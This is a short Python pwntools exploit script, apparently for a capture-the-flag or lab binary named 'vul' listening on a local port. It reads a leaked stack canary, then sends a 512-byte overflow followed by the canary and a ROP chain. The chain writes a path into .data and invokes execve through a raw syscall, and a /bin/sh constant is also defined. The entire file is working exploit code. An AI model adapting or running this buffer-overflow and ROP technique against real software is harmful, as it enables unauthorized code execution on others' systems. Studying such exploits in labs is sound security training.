# coding: utf-8
#!/usr/bin/env python
from pwn import *
import cle

# filename = './vul'
# p = process([filename,'3000'])
p = remote('127.0.0.1',41001) #服务器端口号需提取
canary = u64(p.recv())

file = cle.Loader('../vul')

writeable_addr =  file.main_bin.sections_map['.data'].vaddr #.data
exec_addr = file.main_bin.sections_map['.text'].vaddr #.text

POP_RAX = exec_addr + 0x10e # pop rax ; ret
POP_RDI = exec_addr + 0x110 # pop rdi ; ret
POP_RSI = exec_addr + 0x112 # pop rsi ; ret
POP_RDX = exec_addr + 0x114 # pop rdx ; ret
POP_RCX = exec_addr + 0x118 # pop rcx ; ret
MOV_RSI_RDI = exec_addr + 0x120 # mov [rsi],rdi
SYSCALL = exec_addr + 0x124 # syscall

BIN_SH = 0x68732f6e69622f2f #/bin/sh string
HELLO = 0x6f6c6c65682f2e #./hello

rop = (
    p64(POP_RDI)
    + p64(HELLO)

    + p64(POP_RSI)
    + p64(writeable_addr)

    + p64(MOV_RSI_RDI)

    + p64(POP_RDI)
    + p64(writeable_addr)

    + p64(POP_RSI)
    + p64(0)

    + p64(POP_RDX)
    + p64(0)

    + p64(POP_RAX)
    + p64(59)

    + p64(SYSCALL)
    )


payload = 'A'*512  +'B'*8 + p64(canary) + 'B'*8 + rop


p.writeline(payload)
#p.interactive()
